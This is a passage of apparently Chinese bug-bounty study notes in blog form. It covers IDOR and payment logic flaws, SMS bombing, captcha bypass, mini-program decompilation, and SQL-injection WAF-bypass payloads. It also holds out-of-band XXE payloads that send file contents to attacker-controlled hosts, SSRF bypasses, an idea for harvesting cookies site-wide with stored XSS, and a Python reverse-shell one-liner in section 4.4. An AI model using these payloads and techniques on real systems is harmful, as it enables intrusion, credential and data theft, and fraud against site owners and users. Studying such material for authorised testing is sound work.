访问一下进去了</span></span><br><span class="line"><span class="comment">	</span></span><br><span class="line"><span class="comment">	数据包的关注点</span></span><br><span class="line"><span class="comment">		改提交数据包看传回来的参数变化</span></span><br><span class="line"><span class="comment">		改成确实存在的参数值</span></span><br><span class="line"><span class="comment">		点赞之类不能遍历--&gt;1000条以上--&gt;牢狱之灾</span></span><br><span class="line"><span class="comment">	登录凭证返回过来</span></span><br><span class="line"><span class="comment">	</span></span><br><span class="line"><span class="comment">	业务环境</span></span><br><span class="line"><span class="comment">	点赞 评论 收藏点一下抓包 操作点操作一下抓包看变化</span></span><br><span class="line"><span class="comment">	暂不可买--&gt;可买</span></span><br><span class="line"><span class="comment">	</span></span><br><span class="line"><span class="comment">	不安全对象的直接调用	IDOR</span></span><br><span class="line"><span class="comment">		允许攻击者绕过网站的身份验证机制，通过修改指向对象链接中的参数来直接访问目标对象资源，这类资源可以属于其他用户的数据库条目及服务器系统中的隐私文件等</span></span><br><span class="line"><span class="comment">	付费视频免费看</span></span><br><span class="line"><span class="comment">	付费小说免费看</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">越权登录 返回包id没有鉴权绑定 直接改id</span><br><span class="line">众测中返回包中的token是否存在通用性</span><br><span class="line">功能点删除cookie</span><br><span class="line">验证码短信轰炸</span><br><span class="line">    没有对发送时间 用户 ip进行</span><br><span class="line">    并发绕过</span><br><span class="line">    删除cookie</span><br><span class="line">    手机号码前后加空格，<span class="number">86</span>，<span class="number">086</span>，<span class="number">0086</span>，+<span class="number">86</span>，<span class="number">0</span>，<span class="number">00</span>，/r,/n, 以及特殊符号</span><br><span class="line">验证码暴力破解</span><br><span class="line">    服务器端未对验证时间、次数作出限制，存在爆破的可能性</span><br><span class="line">验证码回显</span><br><span class="line">验证码绕过</span><br><span class="line">    抓包改手机号(json)给两个手机号发 [手机号<span class="number">1</span>,手机号<span class="number">2</span>]</span><br></pre></td></tr></table></figure>

<h3 id="2-7-app漏洞挖掘"><a href="#2-7-app漏洞挖掘" class="headerlink" title="2.7 app漏洞挖掘"></a>2.7 app漏洞挖掘</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	1.adb连接电脑 在手机上执行shell桥梁</span></span><br><span class="line"><span class="comment">	adb shell 进入手机shell</span></span><br><span class="line"><span class="comment">	打开 deeplink</span></span><br><span class="line"><span class="comment">		adb shell am start -W -a android.intent.action.VIEW -d &quot;deeplink&quot;</span></span><br><span class="line"><span class="comment">	打开 activity</span></span><br><span class="line"><span class="comment">		adb shell am start -n 包名/activity名</span></span><br><span class="line"><span class="comment">	转发端口到电脑</span></span><br><span class="line"><span class="comment">		adb forward tcp:27042 tcp:27042</span></span><br><span class="line"><span class="comment">	当前activity</span></span><br><span class="line"><span class="comment">		adb shell dumpsys activity activities</span></span><br><span class="line"><span class="comment">	</span></span><br><span class="line"><span class="comment">	2.frida可以调试app的工具</span></span><br><span class="line"><span class="comment">	常用语句	frida-ps -Ua</span></span><br><span class="line"><span class="comment">	常用frida hook app函数</span></span><br><span class="line"><span class="comment">	</span></span><br><span class="line"><span class="comment">	3.app反编译即java反编译</span></span><br><span class="line"><span class="comment">	jadx为反编译工具</span></span><br><span class="line"><span class="comment">	github.com/skylot/jadx/releases/tag/v1.4.4</span></span><br><span class="line"><span class="comment">	</span></span><br><span class="line"><span class="comment">	18/91分钟 看不下去了</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<h3 id="2-8-后端漏洞"><a href="#2-8-后端漏洞" class="headerlink" title="2.8 后端漏洞"></a>2.8 后端漏洞</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	SQL注入 XXE SSRF		相对独立危害较高	可能导致命令执行</span></span><br><span class="line"><span class="comment">	</span></span><br><span class="line"><span class="comment">	sql绕waf</span></span><br><span class="line"><span class="comment">		1.注释</span></span><br><span class="line"><span class="comment">		2.四则运算</span></span><br><span class="line"><span class="comment">		3.替换函数</span></span><br><span class="line"><span class="comment">		4.云waf</span></span><br><span class="line"><span class="comment">	python 获取ascii码</span></span><br><span class="line"><span class="comment">	ord(&#x27;r&#x27;)=114</span></span><br><span class="line"><span class="comment">	chr(114)=&#x27;r&#x27;</span></span><br><span class="line"><span class="comment">	chr(0x7e)=&#x27;~&#x27;</span></span><br><span class="line"><span class="comment">	框架内不好挖 新加入的内容可能没有加入框架 能挖</span></span><br><span class="line"><span class="comment">	</span></span><br><span class="line"><span class="comment">	xml实体注入，导致ssrf或本地文件读取</span></span><br><span class="line"><span class="comment">	大部分都是docx或xlxs文件导致</span></span><br><span class="line"><span class="comment">	https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration</span></span><br><span class="line"><span class="comment">	xxe payload不会变！！</span></span><br><span class="line"><span class="comment">	1.117.139.173:8080/login	java_sec_code</span></span><br><span class="line"><span class="comment">	dnslog.cn-&gt;y2dkdo.dnslog.cn-&gt;xxe.y2dkdo.dnslog.cn</span></span><br><span class="line"><span class="comment">	文件上传xxe</span></span><br><span class="line"><span class="comment">		解压xlsx文件 有个xxe文件在里面然后给它改了 再压缩回去上传</span></span><br><span class="line"><span class="comment">	</span></span><br><span class="line"><span class="comment">	</span></span><br><span class="line"><span class="comment">	ssrf利用价值 请求内网 请求外网不算洞</span></span><br><span class="line"><span class="comment">	难点在于如何绕过</span></span><br><span class="line"><span class="comment">	ssrf bypass</span></span><br><span class="line"><span class="comment">	1.302 bypass</span></span><br><span class="line"><span class="comment">	2.@字符	(test.com@127.0.0.1)	有的waf只检测前面</span></span><br><span class="line"><span class="comment">	3.dns rebinding</span></span><br><span class="line"><span class="comment">		https://lock.cmpxchg8b.com/rebinder.html</span></span><br><span class="line"><span class="comment">	</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">id <span class="operator">=</span> <span class="number">1</span><span class="comment">/*31321*/</span><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line">id <span class="operator">=</span> <span class="number">1</span><span class="comment">/*!and*/</span><span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line"></span><br><span class="line">id <span class="operator">=</span> <span class="string">&#x27;2&#x27;</span><span class="operator">-</span><span class="literal">true</span></span><br><span class="line">id <span class="operator">=</span> <span class="string">&#x27;2&#x27;</span><span class="operator">-</span>(SUBSTR(DATABASE(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;t&#x27;</span>)<span class="comment">--+		1</span></span><br><span class="line">id <span class="operator">=</span> <span class="string">&#x27;2&#x27;</span><span class="operator">-</span>(SUBSTR(DATABASE(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;1&#x27;</span>)<span class="comment">--+		0</span></span><br><span class="line">id <span class="operator">=</span> <span class="string">&#x27;2&#x27;</span><span class="operator">-</span>(SUBSTR(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;?&#x27;</span>)<span class="comment">--+</span></span><br><span class="line">id <span class="operator">=</span> <span class="string">&#x27;2&#x27;</span><span class="operator">-</span>(SUBSTR(<span class="built_in">CURRENT_USER</span>,<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;?&#x27;</span>)<span class="comment">--+</span></span><br><span class="line">id <span class="operator">=</span> <span class="number">2</span><span class="operator">-</span>(SUBSTR(<span class="built_in">CURRENT_USER</span>,<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span>&quot;?&quot;)<span class="comment">--+</span></span><br><span class="line">id <span class="operator">=</span> <span class="number">2</span><span class="operator">-</span>(ascii(SUBSTR(<span class="built_in">CURRENT_USER</span>,<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">114</span>)</span><br><span class="line"></span><br><span class="line">id <span class="operator">=</span> <span class="number">2</span><span class="operator">-</span>(ord(<span class="built_in">SUBSTRING</span>(<span class="built_in">CURRENT_USER</span>,<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">114</span>)</span><br><span class="line">SUBSTR<span class="comment">--&gt;LEFT</span></span><br><span class="line"><span class="keyword">and</span><span class="comment">--&gt;&amp;&amp;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">检测 加入</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [<span class="meta">&lt;!ENTITY % <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;YOUR-DTD-URL&quot;</span>&gt;</span> %xxe;]&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [<span class="meta">&lt;!ENTITY % <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://ki67aa1etx1dbofbf4j7ng302r8hw6.oastify.com&quot;</span>&gt;</span> %xxe;]&gt;</span></span><br><span class="line">burp有回返说明请求成功</span><br><span class="line"></span><br><span class="line">攻击</span><br><span class="line">抓包找到九二一插入xml的数据报	插入</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [<span class="meta">&lt;!ENTITY % <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;https://exploit-0aed0027045b5457c0b82643014a006d.exploit-server.net/exploit&quot;</span>&gt;</span> %xxe;]&gt;</span></span><br><span class="line"></span><br><span class="line">攻击页面(上面的网址自己的攻击地址) body中写入 替换其中burpdnslog</span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/hostname&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">eval</span> <span class="string">&quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#x27;http://ki67aa1etx1dbofbf4j7ng302r8hw6.oastify.com/?x=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line">%eval;</span><br><span class="line">%exfil;</span><br><span class="line">burp的dnslog会进场更新?</span><br><span class="line"></span><br><span class="line">文件xxe</span><br><span class="line">github.com/JoyChou93/java-sec-code</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.html</span><br><span class="line">&lt;iframe src=127.0.0.1&gt;</span><br><span class="line">请求这个页面会 加载本地127.0.0.1 虽然拒绝连接</span><br><span class="line"></span><br><span class="line">html转pdf过程中 网页任何东西都会转</span><br></pre></td></tr></table></figure>

<h3 id="2-9-另类逻辑漏洞"><a href="#2-9-另类逻辑漏洞" class="headerlink" title="2.9 另类逻辑漏洞"></a>2.9 另类逻辑漏洞</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	cookie可以爆破</span></span><br><span class="line"><span class="comment">	js中的业务</span></span><br><span class="line"><span class="comment">	可控参数的爆破</span></span><br><span class="line"><span class="comment">	短信逻辑问题</span></span><br><span class="line"><span class="comment">	</span></span><br><span class="line"><span class="comment">	cookie一个一个删除 看返回内容</span></span><br><span class="line"><span class="comment">	找出关键的cookie的键值 然后找几个账号看这个包变化进行爆破 几亿用户那种cookie较为容易爆破出来</span></span><br><span class="line"><span class="comment">	xxAAAAAxxAAAAAAxxAAAAAxxAAAAAAA类型</span></span><br><span class="line"><span class="comment">	</span></span><br><span class="line"><span class="comment">	带验证码登录框 注册忘记密码</span></span><br><span class="line"><span class="comment">		弱口令 xss 抓响应包 sql注入 注册admin去覆盖</span></span><br><span class="line"><span class="comment">	js 网页调试器 接口关键字搜索get/ api pos ajax http https</span></span><br><span class="line"><span class="comment">	ajax中</span></span><br><span class="line"><span class="comment">		data:&#123;</span></span><br><span class="line"><span class="comment">			api:&#x27;/v1/passport/reset_psd&#x27;,</span></span><br><span class="line"><span class="comment">			user_login:$(&#x27;.username_ipt&#x27;).val(),</span></span><br><span class="line"><span class="comment">			user_pass:$(&#x27;.password1&#x27;).val(),</span></span><br><span class="line"><span class="comment">			confirm_pass:$(&#x27;.password2&#x27;).val()</span></span><br><span class="line"><span class="comment">		&#125;</span></span><br><span class="line"><span class="comment">		dataType:&#x27;json&#x27;,</span></span><br><span class="line"><span class="comment">		type:&#x27;get&#x27;</span></span><br><span class="line"><span class="comment">		url/api/proxy/index?api=/v1/passport/reset_psd&amp;user_login=..&amp;..&amp;..</span></span><br><span class="line"><span class="comment">	如果验证在调用接口之前 接口还能找的到</span></span><br><span class="line"><span class="comment">	api接口可以挖到一切漏洞</span></span><br><span class="line"><span class="comment">	js断点调试</span></span><br><span class="line"><span class="comment">	后台的修改密码 发包尝试改id=001或者删除cookie看能不能成</span></span><br><span class="line"><span class="comment">	put /api/security/user/7/password?oldPassword=...&amp;newPassword=...</span></span><br><span class="line"><span class="comment">        7-&gt;别的数字比如1 可能是用户的id</span></span><br><span class="line"><span class="comment">        删除oldPassword或者置空</span></span><br><span class="line"><span class="comment">	js突破sign定位</span></span><br><span class="line"><span class="comment">        1.删掉</span></span><br><span class="line"><span class="comment">        2.彩虹表找出来然后猜 涉及md5加密</span></span><br><span class="line"><span class="comment">        3.前端找出sign怎么计算的</span></span><br><span class="line"><span class="comment">    post参数 删 改</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<h3 id="4-3-付费类站点分析与初识情报"><a href="#4-3-付费类站点分析与初识情报" class="headerlink" title="4.3 付费类站点分析与初识情报"></a>4.3 付费类站点分析与初识情报</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 举一反三</span><br><span class="line">用免费的接口去尝试付费的接口 越权</span><br><span class="line">开通vip获取接口 然后使用没有vip的账号对接口进行测试</span><br><span class="line">转战 小程序 app 资产的接口</span><br><span class="line"></span><br><span class="line">二维码保存下来一直扫</span><br><span class="line"></span><br><span class="line">修改返回包的下载劵数量 &gt; 下载所需 --&gt;绕过下载</span><br><span class="line">改所需下载劵-&gt;0</span><br><span class="line">改成vip身份去下载</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 初识情报挖掘</span><br><span class="line">对企业有危害的信息</span><br><span class="line">	1.直接向中黑灰获取技术</span><br><span class="line">	2.根据黑灰利用的方式分析出技术加上获取黑灰技术人员的个人信息</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line">ssrf 第一次用dnslog</span><br><span class="line">第二次10.10.10.1</span><br><span class="line">	如果有数据，会有延迟，请求dnslog会有显示，那么可以判断存在一个无回显的ssrf</span><br><span class="line">请求dnslog会导致泄露cookie</span><br><span class="line">b站视频那个头像位置是有发送的控制了头像保存的地址</span><br><span class="line">此处用存储型xss举例更为恰当</span><br><span class="line">把存储型xss换成请求dnslog的url 全网发---&gt;获取全网cookie</span><br></pre></td></tr></table></figure>

<h3 id="4-4-漏洞分析讲解"><a href="#4-4-漏洞分析讲解" class="headerlink" title="4.4 漏洞分析讲解"></a>4.4 漏洞分析讲解</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">返回包不能并发</span><br><span class="line">充钱不能并发 会掏空你的钱包</span><br><span class="line">并发</span><br><span class="line">    send to turbo intruder</span><br><span class="line">    headers 加个参数</span><br><span class="line">        x-req:%s</span><br><span class="line">    使用examples/race.py</span><br><span class="line"></span><br><span class="line">登录框</span><br><span class="line">	app下载 云安全二维码token(oauth登录授权ak/sk sdk) 忘记密码 js接口 log4j? xss sql注入</span><br><span class="line">找回密码</span><br><span class="line">	验证码有时间10分钟之类可以爆破----&gt;重置密码</span><br><span class="line">	返回包state修改看能不能绕过---&gt;一般不行---&gt;后端不认---&gt;但可以尝试下看看有什么信息</span><br><span class="line">	注册个账号登陆进去</span><br><span class="line">		把它的接口找出来，用没有登陆的账号使用的这些接口，看能不能越权</span><br><span class="line">5g容量 回收站扩容			--&gt;存5g删5g--&gt;存5g删5g--&gt;回复10g</span><br><span class="line">管理后台</span><br><span class="line"></span><br><span class="line">iv encryptData sessionKey---&gt;任意用户登录   aes加密</span><br><span class="line">在线ide做题</span><br><span class="line">	写个rce 反弹shell</span><br><span class="line"></span><br><span class="line">nohup python3 -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;ip&#x27;,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;;echo 111&amp;</span><br><span class="line"></span><br><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;  </span><br><span class="line"></span><br><span class="line">base64进行加密</span><br><span class="line">python ; 可以不换行</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">   	<span class="keyword">import</span> subprocess</span><br><span class="line">    <span class="keyword">import</span> base64</span><br><span class="line">    cmd = <span class="string">&#x27;...&#x27;</span></span><br><span class="line">    ret = subprocess.run(base64.b64decode(cmd.encode()).decode(), shell = <span class="literal">True</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">	<span class="built_in">print</span>(e)</span><br></pre></td></tr></table></figure>

<h3 id="4-6-小程序挖掘方法"><a href="#4-6-小程序挖掘方法" class="headerlink" title="4.6 小程序挖掘方法"></a>4.6 小程序挖掘方法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">#小程序抓包方法</span><br><span class="line">IOS抓包		买个iphone8 7百多</span><br><span class="line">iphone与Burp所在电脑处于同一网段</span><br><span class="line">Burp新增拦截</span><br><span class="line">iphone设置代理</span><br><span class="line">iphone获取证书</span><br><span class="line">iphone安装证书并授权</span><br><span class="line">https://blog.csdn.net/weixin_43222614/article/details/122943719</span><br><span class="line"></span><br><span class="line">Proxifier搭配buro			fiddler也可以</span><br><span class="line"></span><br><span class="line">app抓包 可以考虑再浏览器请求这个ip</span><br><span class="line"></span><br><span class="line">nginx+springboot(title栏小绿叶 也可以没有)</span><br><span class="line">	springboot存在泄露heapdump文件的可能</span><br><span class="line">		springbootscan扫描</span><br><span class="line">		https://blog.csdn.net/weixin_44309905/article/details/127279561</span><br><span class="line">            路由列表</span><br><span class="line">            利用heapdump的工具</span><br><span class="line">                heapdump_tool</span><br><span class="line">                Eclipse MemoryAnalyzer</span><br><span class="line"></span><br><span class="line">小程序反编译</span><br><span class="line">	.../Wechat Files/Applet</span><br><span class="line">	UnpackMiniApp对.wxapkg文件解密---&gt; 工具所在目录wxpack文件夹</span><br><span class="line">	CrackApp(放在D盘) 被解密文件移动到../CrackApp/wxapkg文件夹</span><br><span class="line">		打开CrackApp 刷新 开始执行</span><br><span class="line">	用vscode打开或者微信开发者工具打开</span><br><span class="line">	搜索密钥 secret 找接口api 找key appid</span><br><span class="line">	如果找到大量api接口 导出来写脚本批量访问</span><br><span class="line">	找出来的每个接口又可以sql注入 爆破参数 xss</span><br><span class="line"></span><br><span class="line">敏感信息5要素</span><br><span class="line">	1.身份证</span><br><span class="line">	2.电话号码 家庭住址 银行卡号</span><br><span class="line"></span><br><span class="line">抓小程序app的包 对比 api接口的路径拼接 在哪能输出出来</span><br><span class="line"></span><br><span class="line">删除或者添加接口不能批量爆破</span><br><span class="line"></span><br><span class="line">反编译找云安全密钥进行调用</span><br></pre></td></tr></table></figure>

<h3 id="4-8-后端漏洞讲解"><a href="#4-8-后端漏洞讲解" class="headerlink" title="4.8 后端漏洞讲解"></a>4.8 后端漏洞讲解</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sql注入 xxe ssrf 相对独立 危害较高</span><br><span class="line">现在的sql注入需要大量的探测和fuzz猜参数</span><br><span class="line">sql注入绕waf</span><br><span class="line">	1.注释</span><br><span class="line">	2.四则运算</span><br><span class="line">	3.替换函数</span><br><span class="line">	4.云waf</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#waf大多设置的是黑名单</span><br><span class="line">id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">-- &#x27;</span></span><br><span class="line">id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="comment">-- &#x27;</span></span><br><span class="line">id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="operator">&amp;&amp;</span> <span class="number">1</span><span class="comment">-- &#x27;</span></span><br><span class="line">id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span><span class="operator">&amp;&amp;</span><span class="number">1</span><span class="comment">-- &#x27;</span></span><br><span class="line">id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span><span class="operator">||</span><span class="number">1</span><span class="comment">-- &#x27;</span></span><br><span class="line">id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> DATABASE<span class="comment">/*!(*/</span>)<span class="operator">=</span><span class="string">&#x27;test&#x27;</span><span class="comment">-- &#x27;</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="operator">/</span>(length(DATABASE())<span class="operator">=</span><span class="number">1</span>)    <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,....n</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> BENCHMARK(<span class="number">999999</span>,MD5(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">sleep<span class="comment">--&gt;benchmark</span></span><br><span class="line">ascii<span class="comment">--&gt;ord</span></span><br><span class="line">substr<span class="comment">--&gt;substring</span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">基于java的xxe只能读一行数据  /etc/hostname</span><br><span class="line">xxe如果被内部实体解析xml---&gt;&gt;&gt;ssrf</span><br><span class="line">doc--&gt;&gt;docx(xml解析) xlsx</span><br><span class="line"></span><br><span class="line">表格xxe插下面的表明 每个单元格</span><br><span class="line">文档 字体能插</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">前后端分离 api----&gt;&gt;&gt;&gt;ssrf</span><br><span class="line">302 bypass</span><br><span class="line">@字符 (test.com@127.0.0.1)</span><br><span class="line">dns rebinding	在两个IP之间跳	youtube $2000</span><br><span class="line">	https://lock.cmpxchg8b.com/rebinder.html</span><br><span class="line">	靶场	https://github.com/leetCipher/bug-bounty-labs</span><br><span class="line">80分钟到dns rebinding</span><br></pre></td></tr></table></figure>

<h3 id="第五期"><a href="#第五期" class="headerlink" title="第五期"></a>第五期</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">### 5.3 vip站点分析</span><br><span class="line">### 5.6 漏洞讲解</span><br><span class="line">### 5.8 支付漏洞</span><br><span class="line">### 5.9 小程序挖掘思路</span><br></pre></td></tr></table></figure>

